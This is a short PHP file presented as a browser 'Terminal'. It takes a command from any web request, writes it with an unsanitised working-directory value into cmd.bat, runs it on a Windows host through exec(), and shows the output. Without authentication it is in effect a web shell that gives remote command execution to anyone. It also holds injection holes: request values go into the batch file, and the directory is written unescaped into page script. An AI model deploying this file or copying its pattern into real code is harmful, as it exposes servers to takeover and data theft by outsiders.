<?PHP
    if ($_REQUEST['cmd']){
        $cmd = $_REQUEST['cmd'];
        $cmd = "cd /d ". $_REQUEST['pwd'] . "\n" . $cmd;
        file_put_contents("cmd.bat", $cmd);
        $cmd = "cmd.bat";
        ?>
        <hr />
        <h class="cmd">&gt; <?= htmlspecialchars($cmd) ?></h>
        <div class="result">
            <?PHP $result = null; exec($cmd , $result); $result = iconv("gbk", "utf-8", implode("\n", $result)); ?>
            <?= htmlspecialchars($result); ?>
        </div>
        <?PHP
        $result = null;
        exec("cd ". $_SESSION['cd'], $result);
        $pwd = $result[0];
        ?>
        <script type="text/javascript">
            window.pwd = '<?= $pwd ?>'
        </script>
        <?PHP
        die();
    }
?>
<!DOCTYPE HTML >
<meta http-equiv="content-type" content="text/html; charset=GBK" />
<html>

    <head>

        <title>Terminal</title>
    </head>
    <script type="text/javascript" src="/js/jquery.js" > </script>
    <script type="text/javascript" language="JavaScript" >
        function do_run(){
            var cmd = $("#cmd").val();
            $.get("", { 'cmd': cmd, 'pwd': window.pwd}, function(data){
                $("#log").append(data);
                scrollTo(0, 99999999);
            });
        }
        function cmd_on_keydown(){
            if (event.keyCode == 13){
                do_run();
            }
        }
        $(function(){
           $("#cmd").focus();
        });
    </script>
    <style type="text/css">
        .terminal {
            color: #1f1f1f;
            background-color: #dfffd3;
            font: monospace;
        }
        div.result{
            white-space: pre-wrap;
        }
        .cmd {

        }
    </style>
<body class="terminal">
    <div id="log">

    </div>
    <input type="text" style="width: 80%" nam="cmd" id="cmd" onkeydown="cmd_on_keydown()" />
    <input type="button" value="RUN" onclick="do_run()" />
</body>
</html>